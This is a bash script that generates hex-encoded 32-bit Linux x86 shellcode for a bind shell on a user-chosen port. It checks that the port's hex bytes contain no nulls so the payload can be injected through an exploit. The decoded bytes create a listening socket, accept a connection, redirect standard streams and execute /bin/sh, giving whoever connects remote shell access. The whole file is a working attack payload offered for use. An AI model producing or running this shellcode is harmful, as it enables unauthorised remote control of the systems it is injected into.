#!/bin/bash

usage() {
	echo "
Usage: $0 -p <port>
	port: must be greater than 1024 and corresponding hex value must not contain '0x00' value
" 1>&2
}

while getopts ":p:" p; do
	case "${p}" in
		p)
			if [ $OPTARG -le 1024 ]; then
				usage
				exit 1
			fi
			P=`echo "obase=16; $OPTARG" | bc`
			;;
		*)
			usage
			exit 2
			;;
	esac
done

if [ -z "$P" ]; then
	usage
	exit 3
fi

PORT=`printf "%4s" "$P" | tr [:space:] '0'`
HPORT=`echo $PORT | cut -c 1-2`
LPORT=`echo $PORT | cut -c 3-4`

if [ "$HPORT" = '00' -o "$LPORT" = '00' ]; then
	usage
	exit 4
fi

echo "
"
echo \\x6a\\x66\\x58\\x6a\\x01\\x5b\\x99\\x52\\x53\\x6a\\x02\\x89\\xe1\\xcd\\x80\\x5e\\x96\\x93\\xb0\\x66\\x52\\x66\\x68\\x$HPORT\\x$LPORT\\x66\\x53\\x89\\xe1\\x6a\\x10\\x51\\x56\\x89\\xe1\\xcd\\x80\\xb0\\x66\\x80\\xc3\\x02\\x52\\x56\\x89\\xe1\\xcd\\x80\\xb0\\x66\\x43\\x52\\x52\\x56\\x89\\xe1\\xcd\\x80\\x31\\xc9\\xb1\\x02\\x89\\xc3\\xb0\\x3f\\xcd\\x80\\x49\\x79\\xf9\\x6a\\x0b\\x58\\x52\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x41\\x89\\xe3\\xcd\\x80
echo "
"

exit 0
